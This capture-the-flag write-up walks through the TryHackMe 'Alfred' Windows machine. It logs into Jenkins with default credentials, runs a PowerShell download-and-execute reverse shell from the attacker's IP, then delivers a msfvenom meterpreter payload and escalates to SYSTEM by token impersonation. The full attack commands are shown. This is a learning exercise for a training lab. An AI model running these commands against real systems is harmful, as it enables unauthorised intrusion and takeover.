# **Description**

Hello hackers, I hope you are doing well. We are doing [Alfred](https://tryhackme.com/room/alfred) from [TryHackMe](https://tryhackme.com). Easy windows machine running Jenkins in a webserver. We use some known credentials to login to Jenkins and run some command that would give us a reverse shell. After that we generate a payload using msfvenom and upload it to the target to get a meterpreter shell that would make it easy to escalate our privileges on the machine.

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```Bash

```

We got 3 ports open, webserver on port 80, probably rdp on port 3389, and another webserver on port 8080.

## Web

Let's go to the webserver on port 80.

There is a picture of Bruce Wayne and some text, nothing really interesting.

Let's go to port 8080.

![](/assets/img/tryhackme/alfred/2.png)

It's Jenkins login page. If we some of the most used credentials, we'll be able to login successfully.

# **Foothold**

We need to find a place where we can execute command. To do that, go to `project`.

![](/assets/img/tryhackme/alfred/4.png)

Now go to `configure`.

![](/assets/img/tryhackme/alfred/5.png)

Great! We found a place to execute windows batch commands. Time for a reverse shell.

First, we need to download this [script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and serve it with a webserver, we can use python for that: `sudo python3 -m http.server 80`.

After that, we need to set up a listener to receive the shell: `nc -lvnp 9001`

![](/assets/img/tryhackme/alfred/6.png)

Now we need to put the following powershell command in place and run it.

```Powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.31.131:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.31.131 -Port 9001
```
>Change the ip addresses to yours(tun0)

![](/assets/img/tryhackme/alfred/21.png)


After entering the command, press `save`. Then go to `Build now`

![](/assets/img/tryhackme/alfred/20.png)

Now if we go to our listener, we should see that we have received a shell.

# **Privilege Escalation**

For this part, we can upgrade our shell to meterpreter in order to easily escalate our privileges.

First, let's create a payload using `msfvenom`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.31.131 LPORT=1234 -f exe -o shell.exe
```
>Don't forget to change the ip address.

![](/assets/img/tryhackme/alfred/8.png)

Good, let's fire up metasploit and setup a handler listener.

![](/assets/img/tryhackme/alfred/9.png)

We need to set the options to the same ones we used when we created the payload with `msfvenom`

Great! Now in the same directory where we created the exploit, set up an http server like the one we did before:`sudo python3 -m http.server 80` so that we can upload it to the target.

After that we need to execute the following powershell command in the shell we just got to upload the exploit.

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.31.131/shell.exe','shell.exe')"
```

![](/assets/img/tryhackme/alfred/22.png)

Great! We have uploaded the exploit successfully, now execute it with the command `Start-Process "shell.exe"`

![](/assets/img/tryhackme/alfred/10.png)

Now if we go to our listener on metasploit, we can see that we received a meterpreter shell.

![](/assets/img/tryhackme/alfred/11.png)

Now to have system privileges, which is the higher ranking in a windows machine, we execute the command `getsystem`.

![](/assets/img/tryhackme/alfred/12.png)

And we got it, but we need to understand how that worked. To do that, first drop a shell using the command `shell`, and then execute `whoami /priv`
> Do that as the user alfred not authority\system.

![](/assets/img/tryhackme/alfred/13.png)

With that command, we can see the different tokens we have. One of the tokens we have is `SeImpersonatePrivilege`. To abuse that, let's load a module named `incognito` and run the command `impersonate_token "BUILTIN\Administrators"`

![](/assets/img/tryhackme/alfred/14.png)

We got system privileges. Now let's go to the directory where the flag is and read it.

![](/assets/img/tryhackme/alfred/15.png)

We can't, even though we have the higher privileged token. To solve that, we need to change the process we currently in to a process that has system privilege.

First, list the processes with `ps`.

![](/assets/img/tryhackme/alfred/16.png)

We choose the **services** process, now use the command `migrate` with the process number of **services**.

![](/assets/img/tryhackme/alfred/17.png)

And we that, we have successfully rooted **Alfred**.
